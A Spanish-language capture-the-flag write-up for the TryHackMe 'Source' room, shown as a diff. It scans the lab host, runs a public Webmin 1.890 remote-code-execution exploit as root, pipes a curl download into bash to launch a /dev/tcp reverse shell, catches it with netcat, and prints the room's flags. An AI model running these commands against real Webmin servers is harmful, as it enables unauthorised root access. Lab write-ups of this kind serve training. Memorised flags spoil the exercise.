@@ -1,0 +1,58 @@
+TryHackMe
+Source
+
+Nmap
+
+	nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.146.202 -oN nmap
+
+	• 22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	• 10000/tcp open  snet-sensor-mgmt syn-ack ttl 64
+
+	>nmap -p 22,10000 -sS -sC -sV --open -vvv -Pn 10.10.146.202 -oN nmap
+	
+	• 22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+	• 10000/tcp open  http    syn-ack ttl 64 MiniServ 1.890 (Webmin httpd)
+
+En el puerto 10000 encontramos un login, pero para verlo tenemos que colocar antes "https" en Burp. Luego de intentar hacer fuerza bruta sin resultados, procedemos a buscar una vulnerabilidad de el servicio Webmin:
+
+Encontramos el siguiente exploit en GitHub: "https://raw.githubusercontent.com/foxsin34/WebMin-1.890-Exploit-unauthorized-RCE/master/webmin-1.890_exploit.py"
+
+Nos permite ejecutar comandos como root.
+
+> python3 /home/kali/exploits/webmin-1.890_exploit.py 10.10.146.202 10000 'whoami'
+	> root
+
+Ahora procederemos a crear una reverse shell para tener control de la web.
+
+Primero creamos la reverse shell, pero para que la web la reconozca deberá llamarse "index.html".
+
+> nano index.html
+	> bash -i >& /dev/tcp/10.18.112.21/443 0>&1
+
+Aquí creamos una reverse shell en bash que nos dará respuesta por el puerto 443.
+
+Montamos un servidor Python para poder subir la reverse shell.
+
+> python3 -m http.server 8080
+
+Ahora procedemos a subir la reverse shell con curl.
+
+> python3 /home/kali/exploits/webmin-1.890_exploit.py 10.10.146.202 10000 'curl 10.18.112.21/index.html | bash'
+
+Abrimos Netcat.
+
+> nc -nlvp 443
+
+Y refrescamos la página.
+
+Ya tenemos la reverse shell como root. Ahora buscamos las flags.
+
+> find / -name 'user.txt' 2>/dev/null
+
+user.txt
+THM{SUPPLY_CHAIN_COMPROMISE}
+
+> find / -name 'root.txt' 2>/dev/null
+
+root.txt
+THM{UPDATE_YOUR_INSTALL}"
